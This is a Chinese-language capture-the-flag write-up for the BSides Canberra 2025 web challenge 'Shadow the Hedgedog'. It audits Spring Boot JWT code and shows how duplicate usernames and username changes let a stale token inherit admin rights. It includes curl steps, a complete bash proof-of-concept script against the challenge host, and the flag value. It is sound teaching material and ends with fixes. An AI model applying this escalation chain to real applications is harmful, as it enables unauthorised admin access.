## Shadow the Hedgedog Web CTF Writeup（简体中文）

- 赛事：BSides Canberra 2025（题目名：Shadow the Hedgedog）
- 目标地址：`https://web-shadow-the-hedgedog-a360d99d6aeb.c.sk8.dog`
- 附件：提供了完整后端源码（Spring Boot + Thymeleaf + JWT）
- FLAG 最终值：`skbdg{i_am_th3_ultimat3_lif3form_woof!}`

> 注：题面提示 Kotlin，但附件源码是 Java（Spring Boot 3.5.x）。

---

### 一、功能与指纹

- 登录/注册（`/login`、`/signup`），登录后服务端通过 `Set-Cookie: shadow=<JWT>` 下发 HttpOnly JWT。
- 用户主页（`/home`）展示用户名、可“修改用户名”（`/change-username`）、提供“创建管理员账号”（`/create-admin`）按钮。
- 管理员专属页面（`/flag`，`@PreAuthorize("hasRole('ADMIN')")`）展示 FLAG。
- H2 控制台开启但禁止远程（`/h2-console/` -> webAllowOthers=false）。

---

### 二、关键代码审计（根因定位）

- 创建管理员接口：任何已登录用户（包含普通用户）都可调用 `create-admin`，服务端会生成一个随机 UUID 作为“管理员用户名”，并以闪存消息的形式回显在 `/home`。

```103:121:/Users/lov3/Downloads/src/src/main/java/sk8boarding/dog/shadow_the_hedgedog/Routes.java
    @PostMapping("/create-admin")
    @PreAuthorize("hasRole('ADMIN') || hasRole('USER')")
    public String createAdmin(RedirectAttributes redirectAttrs) {
        String username = UUID.randomUUID().toString();
        String password = UUID.randomUUID().toString();

        try {
            userService.loadUserByUsername(username);
            redirectAttrs.addAttribute("error", "Username taken");
            return "redirect:/";
        } catch (UsernameNotFoundException e) {
        }

        String encoded = passwordEncoder.encode(password);
        UserAccount admin = new UserAccount(username, encoded, "ROLE_ADMIN");
        userService.saveUser(admin);
        redirectAttrs.addFlashAttribute("message", String.format("Admin '%s' created", username));
        return "redirect:/home";
    }
```

- 修改用户名功能：允许把当前账号的 `username` 直接改为任意字符串；改名后会清除 JWT Cookie，并要求用户重新登录。

```133:145:/Users/lov3/Downloads/src/src/main/java/sk8boarding/dog/shadow_the_hedgedog/Routes.java
    @PostMapping(path = "/change-username")
    @PreAuthorize("hasRole('ADMIN') || hasRole('USER')")
    public String changeUsername(@RequestParam String newUsername,
                                 RedirectAttributes redirectAttrs,
                                 HttpServletResponse response
    ) {
        UserAccount user = (UserAccount) SecurityContextHolder.getContext().getAuthentication().getPrincipal();
        user.setUsername(newUsername);
        userService.saveUser(user);
        redirectAttrs.addFlashAttribute("message", "Username successfully changed. Please log in again.");
        unsetJwtCookie(response);
        return "redirect:/login";
    }
```

- 鉴权过滤器：只从 `shadow` Cookie 中取出 JWT，解析 `sub`（subject）作为“用户名”，然后去数据库按“用户名”加载用户对象，进而决定权限。注意：并未使用 JWT 中的 `role`，而是二次查询数据库，以“当前数据库中第一个同名用户”的权限为准。

```28:52:/Users/lov3/Downloads/src/src/main/java/sk8boarding/dog/shadow_the_hedgedog/JwtFilter.java
    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain chain)
        throws ServletException, IOException {

        String token = null;
        if (request.getCookies() != null) {
            for (Cookie c : request.getCookies()) {
                if ("shadow".equals(c.getName())) {
                    token = c.getValue();
                    break;
                }
            }
        }

        if (token != null) {
            try {
                String username = getUserIdFromToken(token);
                if (username != null) {
                    applySuccessfulAuth(request, username);
                }
            } catch (Exception ex) {
            }
        }

        chain.doFilter(request, response);
    }
```

```55:62:/Users/lov3/Downloads/src/src/main/java/sk8boarding/dog/shadow_the_hedgedog/JwtFilter.java
    private void applySuccessfulAuth(HttpServletRequest request, String username) {
        UserDetails user = userService.loadUserByUsername(username);
        UsernamePasswordAuthenticationToken authentication =
            new UsernamePasswordAuthenticationToken(user, null, user.getAuthorities());
        authentication.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));

        SecurityContextHolder.getContext().setAuthentication(authentication);
    }
```

- 用户查询：按用户名返回 `List<UserAccount>`，并没有唯一约束；`loadUserByUsername` 只取“第一个命中的用户”。这意味着“同名用户”是允许存在的，而且哪一个排在首位是未定义行为。

```8:11:/Users/lov3/Downloads/src/src/main/java/sk8boarding/dog/shadow_the_hedgedog/UserRepository.java
public interface UserRepository extends JpaRepository<UserAccount, Long> {
    List<UserAccount> findByUsername(String username);
}
```

```16:23:/Users/lov3/Downloads/src/src/main/java/sk8boarding/dog/shadow_the_hedgedog/UserService.java
    @Override
    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {
        List<UserAccount> user = users.findByUsername(username);
        if (user.isEmpty()) {
             throw new UsernameNotFoundException("User not found");
        }
        return user.get(0);
    }
```

- FLAG 页面只要求 `hasRole('ADMIN')`：

```147:153:/Users/lov3/Downloads/src/src/main/java/sk8boarding/dog/shadow_the_hedgedog/Routes.java
    @GetMapping(path = "/flag")
    @PreAuthorize("hasRole('ADMIN')")
    public String flag(Model model) {
        String flag = System.getenv("FLAG");
        model.addAttribute("flag", flag);
        return "flag";
    }
```

> 综上，“可重复用户名 + 修改用户名 + 以用户名作为 JWT subject + 认证时按用户名去 DB 取第一个用户并据此赋权”的组合，构成了**用户名/身份混淆（confusion）**漏洞。

---

### 三、漏洞成因（链路）

1. 普通用户登录后，拥有修改自身用户名的能力（可改为任意字符串），并可调用 `create-admin` 创建一个新管理员，管理员的“用户名”为一个 UUID（服务端会在 `/home` 闪现提示“Admin 'UUID' created”）。
2. 攻击者可把自己的用户名改成这个管理员的 UUID，造成“同名冲突”。随后再次以该 UUID 登录，服务端会给出一个 `shadow` JWT，其中 `sub`=该 UUID。
3. 然后攻击者再把自己的用户名改回其他任意字符串（与管理员 UUID 解耦），此时数据库中“UUID 这个名字”只剩下真正的管理员账号。
4. 攻击者保留之前捕获的 `shadow` JWT，再带着这个旧 token 请求 `/flag`。鉴权过滤器会：
   - 从 token 取到 `sub=UUID`；
   - 进数据库用“UUID”查找用户并取第一个（现在只剩管理员）；
   - 于是以管理员的权限进入 `/flag`，拿到 FLAG。

> 关键在于：`JwtFilter` 并未校验“当前登录用户是否仍然是该 subject 的拥有者”，而是无条件用 `sub` 去 DB 查当前的“同名用户”。改名 + 旧 token 就实现了**“越权身份置换”**。

---

### 四、复现步骤（手工）

以下均可用浏览器完成，也提供 `curl` 版。

1) 注册并登录一个普通用户：

```bash
# 注册
curl -i -c cookies.txt -b cookies.txt \
  -X POST 'https://web-shadow-the-hedgedog-a360d99d6aeb.c.sk8.dog/signup' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'username=attacker123&password=Password1'

# 登录（服务端会下发 Set-Cookie: shadow=...）
curl -i -c cookies.txt -b cookies.txt \
  -X POST 'https://web-shadow-the-hedgedog-a360d99d6aeb.c.sk8.dog/login' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'username=attacker123&password=Password1'
```

2) 创建管理员并获取管理员 UUID（从 `/home` 的闪存消息中解析）：

```bash
# 触发创建管理员
curl -s -c cookies.txt -b cookies.txt \
  -X POST 'https://web-shadow-the-hedgedog-a360d99d6aeb.c.sk8.dog/create-admin' \
  -H 'Content-Type: application/x-www-form-urlencoded' --data '' >/dev/null

# 打开 /home 并解析 "Admin '...UUID...' created"
ADMIN_UUID=$(curl -s -c cookies.txt -b cookies.txt \
  'https://web-shadow-the-hedgedog-a360d99d6aeb.c.sk8.dog/home' \
  | sed -n "s/.*Admin '\([^']\+\)'.*/\1/p")

echo "Admin UUID: $ADMIN_UUID"
```

3) 把自己的用户名改成该 UUID，然后再次用该 UUID 登录，以捕获 `shadow` JWT 值：

```bash
# 改名为管理员 UUID（会清空 shadow）
curl -s -i -c cookies.txt -b cookies.txt \
  -X POST 'https://web-shadow-the-hedgedog-a360d99d6aeb.c.sk8.dog/change-username' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data "newUsername=$ADMIN_UUID" >/dev/null

# 再以该 UUID 登录，抓取响应头中的 Set-Cookie: shadow=...
SHADOW=$(curl -s -D - -o /dev/null -c cookies.txt -b cookies.txt \
  -X POST 'https://web-shadow-the-hedgedog-a360d99d6aeb.c.sk8.dog/login' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data "username=$ADMIN_UUID&password=Password1" \
  | awk -F': ' '/^Set-Cookie: shadow=/{print $2}' | sed -E 's/;.*//' | sed 's/^shadow=//')

echo "Captured shadow token length: ${#SHADOW}"
```

4) 把自己的用户名再改回任意新值（与管理员 UUID 脱钩），仅携带上一步捕获的 `shadow` 访问 `/flag`：

```bash
# 改名回其他任意值
curl -s -i -c cookies.txt -b cookies.txt \
  -X POST 'https://web-shadow-the-hedgedog-a360d99d6aeb.c.sk8.dog/change-username' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data "newUsername=whoami-$RANDOM" >/dev/null

# 仅带旧 token 访问 /flag（此时 DB 中该 UUID 只对应真正管理员）
curl -s -H "Cookie: shadow=$SHADOW" \
  'https://web-shadow-the-hedgedog-a360d99d6aeb.c.sk8.dog/flag' | sed -n '1,120p'
```

如无意外，将返回 FLAG 页面，包含：

```text
skbdg{i_am_th3_ultimat3_lif3form_woof!}
```

---

### 五、一键 PoC（Bash）

下面脚本整合了注册→登录→创建管理员→解析 UUID→改名→二次登录抓 token→改回名→仅带 token 读 `/flag` 全流程，成功时打印 FLAG：

```bash
#!/usr/bin/env bash
set -euo pipefail
BASE='https://web-shadow-the-hedgedog-a360d99d6aeb.c.sk8.dog'
JAR="/tmp/shadow_ctf.$$.cookies"; : > "$JAR"
U="p$RANDOM$RANDOM"; P='Password1'

# 注册 + 登录
curl -s -i -c "$JAR" -b "$JAR" -X POST "$BASE/signup" -H 'Content-Type: application/x-www-form-urlencoded' --data "username=$U&password=$P" >/dev/null
curl -s -i -c "$JAR" -b "$JAR" -X POST "$BASE/login"  -H 'Content-Type: application/x-www-form-urlencoded' --data "username=$U&password=$P" >/dev/null

# 创建管理员并从 /home 解析 Admin 'UUID' created
curl -s -i -c "$JAR" -b "$JAR" -X POST "$BASE/create-admin" -H 'Content-Type: application/x-www-form-urlencoded' --data '' >/dev/null
ADMIN=$(curl -s -c "$JAR" -b "$JAR" "$BASE/home" | sed -n "s/.*Admin '\([^']\+\)'.*/\1/p")
[ -z "$ADMIN" ] && { echo '[-] parse admin uuid failed'; exit 1; }

echo "[+] admin: $ADMIN"

# 改名为管理员 UUID（清空 shadow），再用该 UUID 登录并抓取 shadow 值
curl -s -i -c "$JAR" -b "$JAR" -X POST "$BASE/change-username" -H 'Content-Type: application/x-www-form-urlencoded' --data "newUsername=$ADMIN" >/dev/null
SHADOW=$(curl -s -D - -o /dev/null -c "$JAR" -b "$JAR" -X POST "$BASE/login" -H 'Content-Type: application/x-www-form-urlencoded' --data "username=$ADMIN&password=$P" | awk -F': ' '/^Set-Cookie: shadow=/{print $2}' | sed -E 's/;.*//' | sed 's/^shadow=//')
[ -z "$SHADOW" ] && { echo '[-] capture shadow failed'; exit 2; }

echo "[+] shadow.len = ${#SHADOW}"

# 再改回任意名，随后仅带保存的 shadow 访问 /flag
curl -s -i -c "$JAR" -b "$JAR" -X POST "$BASE/change-username" -H 'Content-Type: application/x-www-form-urlencoded' --data "newUsername=q$RANDOM$RANDOM" >/dev/null
HTML=$(curl -s -H "Cookie: shadow=$SHADOW" "$BASE/flag")
FLAG=$(printf '%s' "$HTML" | sed -n 's/.*\(skbdg{[^}]*}\).*/\1/p')
[ -n "$FLAG" ] && echo "[+] FLAG: $FLAG" || { echo '[-] flag not found'; echo "$HTML" | sed -n '1,80p'; exit 3; }
```

---

### 六、为何可行（时序要点）

- 第一次以 UUID 登录获得的 `shadow` token，`sub` 固定为该 UUID；
- 后续即使把自己的用户名改走，数据库里“这个 UUID 名字”只剩真正管理员记录；
- 过滤器用 `sub` 去 DB 取“第一个同名用户” -> 此时获得的是管理员对象及其 `ROLE_ADMIN`，成功越权。

---

### 七、修复建议

- 为 `UserAccount.username` 添加唯一约束，并在修改用户名处校验重名，禁止产生“同名用户”。
- JWT `sub` 建议使用用户不可变的主键（如 `id`/UUID），不要使用可变的 `username`。
- 认证时应校验 JWT 的 `sub` 与当前会话用户的一致性，避免“旧 token 冒充最新同名用户”。
- 如果要使用 JWT 中的 `role`，需要与数据库实时状态进行核对（或在变更关键属性时强制失效旧 token）。
- `loadUserByUsername` 不应返回 List 的“第一个”，应保证唯一性或显式按创建时间/主键排序并拒绝重名。

---

### 八、最终结果

- 复现成功，拿到 FLAG：

```text
skbdg{i_am_th3_ultimat3_lif3form_woof!}
```

---

### 九、附注

- H2 Console 虽开但禁止远程，无法作为突破口；题目核心在于业务逻辑与鉴权模型的错配。
- 题面 Kotlin 提示不影响利用；Java 源码即足以完成分析与攻击。
